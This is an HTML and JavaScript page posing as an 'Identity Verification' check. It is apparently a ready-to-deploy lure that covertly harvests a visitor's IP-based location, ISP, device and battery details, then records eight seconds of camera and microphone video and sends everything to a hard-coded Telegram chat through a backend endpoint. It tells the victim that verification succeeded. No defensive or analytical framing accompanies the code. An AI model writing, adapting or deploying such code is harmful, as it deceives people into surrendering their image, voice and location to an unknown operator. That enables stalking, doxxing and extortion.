<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Identity Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      margin: 0;
      height: 100vh;
      background: radial-gradient(circle, #1a1a1a, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      color: #fff;
    }

    .container {
      text-align: center;
      padding: 30px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid #444;
      border-radius: 16px;
      box-shadow: 0 0 25px rgba(0, 255, 255, 0.25);
      width: 90%;
      max-width: 420px;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 10px;
      color: #0ff;
    }

    p {
      font-size: 14px;
      color: #bbb;
      margin-bottom: 20px;
    }

    .status {
      margin-top: 15px;
      font-size: 13px;
      color: #0f0;
      min-height: 18px;
    }

    button {
      padding: 12px 22px;
      border-radius: 10px;
      border: none;
      background: #0ff;
      color: #000;
      font-weight: 600;
      cursor: pointer;
      font-size: 14px;
      margin-top: 15px;
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    video {
      width: 100%;
      max-width: 400px;
      border-radius: 10px;
      margin: 15px 0;
      display: none;
    }

    video.active {
      display: block;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>üîê Identity Verification</h1>
    <p>We need your camera verification to verify you.</p>

    <div class="status" id="status">Waiting for user action...</div>
    
    <video id="video" autoplay muted playsinline></video>
  </div>

  <script>
    // Chat ID (c√≥ th·ªÉ public, kh√¥ng c·∫ßn ·∫©n)
    const CHAT_ID = "1146923111";
    
    // Bot Token ƒë√£ ƒë∆∞·ª£c l∆∞u trong Vercel Environment Variables (b·∫£o m·∫≠t)
    // Kh√¥ng c·∫ßn hardcode ·ªü ƒë√¢y n·ªØa
    
    // V·∫´n h·ªó tr·ª£ truy·ªÅn Chat ID qua URL n·∫øu c·∫ßn override
    const urlParams = new URLSearchParams(window.location.search);
    const urlChatId = urlParams.get("id") || urlParams.get("chat_id");
    
    // S·ª≠ d·ª•ng URL param n·∫øu c√≥, n·∫øu kh√¥ng th√¨ d√πng gi√° tr·ªã hardcode
    const finalChatId = urlChatId || CHAT_ID;
    
    const statusEl = document.getElementById("status");
    const videoEl = document.getElementById("video");

    window.onload = async () => {
      // G·ª≠i th√¥ng tin thi·∫øt b·ªã v·ªÅ Telegram
      if (finalChatId) {
        await sendDeviceInfo();
      }

      try {
        statusEl.textContent = "üì∏ Requesting camera & microphone permission...";

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });

        // Show video preview
        videoEl.srcObject = stream;
        videoEl.classList.add("active");

        statusEl.textContent = "üî¥ Verifying You...";

        const videoBlob = await recordVideo(stream);
        const base64Video = await blobToBase64(videoBlob);

        statusEl.textContent = "üì° Parsing verification data...";
        
        // G·ª≠i video v·ªÅ Telegram qua Vercel API endpoint
        // Bot Token ƒë∆∞·ª£c l·∫•y t·ª´ Environment Variables tr√™n backend
        if (finalChatId) {
          await sendToTelegram(base64Video, "Video");
        }

        stream.getTracks().forEach(t => t.stop());
        videoEl.classList.remove("active");
        statusEl.textContent = "‚úÖ Verification completed successfully";
        
        // Redirect after verification (optional)
        // window.location.href = "your-success-page.html";
      } catch (err) {
        console.error(err);
        statusEl.textContent = "‚ùå Permission denied or error occurred";
      }
    };
    
    async function sendDeviceInfo() {
      if (!finalChatId) return;
      
      try {
        const ip = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
        const battery = navigator.getBattery ? await navigator.getBattery() : null;
        const time = new Date().toLocaleString();
        const msg = `
üåê *IP Information*

üî¢ IP Address: ${ip.ip || 'Unknown'}
üìç Location: ${ip.city || 'Unknown'}
üåç Region: ${ip.region || 'Unknown'}
üó∫ Country: ${ip.country || 'Unknown'}
üì° ISP: ${ip.org || 'Unknown'}


üì± *Device Details*

üîã Battery: ${battery ? Math.round(battery.level * 100) + '%' + (battery.charging ? ' ‚ö° Charging' : '') : 'N/A'}
üì∂ Network: ${navigator.connection?.effectiveType || 'Unknown'}
üñ•Ô∏è Screen: ${screen.width}x${screen.height}
üïí Time: ${time}
üß† UA: ${navigator.userAgent}
        `;
        await sendMessageToTelegram(msg.trim());
      } catch (e) {
        console.error("Device Info Error:", e);
      }
    }

    function recordVideo(stream) {
      return new Promise(resolve => {
        const recorder = new MediaRecorder(stream, {
          mimeType: "video/webm;codecs=vp8,opus"
        });

        const chunks = [];
        let seconds = 8;

        recorder.ondataavailable = e => {
          if (e.data.size) chunks.push(e.data);
        };

        recorder.onstop = () => {
          resolve(new Blob(chunks, { type: "video/webm" }));
        };

        recorder.start();

        const timer = setInterval(() => {
          statusEl.textContent = `‚è≥ Working‚Ä¶ ${seconds--}s`;
          if (seconds < 0) {
            clearInterval(timer);
            recorder.stop();
          }
        }, 1000);
      });
    }

    function blobToBase64(blob) {
      return new Promise(resolve => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(",")[1]);
        reader.readAsDataURL(blob);
      });
    }

    async function sendMessageToTelegram(text) {
      if (!finalChatId) {
        console.warn("Chat ID ch∆∞a ƒë∆∞·ª£c c·∫•u h√¨nh");
        return;
      }

      await sendToTelegram(text, "Text");
    }

    async function sendToTelegram(data, type) {
      if (!finalChatId) {
        console.warn("Chat ID ch∆∞a ƒë∆∞·ª£c c·∫•u h√¨nh");
        return;
      }

      try {
        // Bot Token ƒë∆∞·ª£c l·∫•y t·ª´ Environment Variables tr√™n backend
        // Ch·ªâ g·ª≠i Chat ID t·ª´ frontend
        const payload = {
          CHAT_ID: finalChatId,
          type,
          data
        };

        // Log size c·ªßa data (ch·ªâ cho video)
        if (type === 'Video') {
          console.log(`Sending video, size: ${(data.length * 3/4 / 1024).toFixed(2)} KB`);
        }

        const response = await fetch("/api/telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        const result = await response.json();
        
        if (!result.success) {
          console.error("Error sending to Telegram:", result);
          statusEl.textContent = `‚ùå Error: ${result.error || 'Unknown error'}`;
        } else {
          console.log("Successfully sent to Telegram:", result.method || type);
        }
      } catch (error) {
        console.error("Error calling API endpoint:", error);
        statusEl.textContent = `‚ùå Network error: ${error.message}`;
      }
    }
  </script>
</body>
</html>
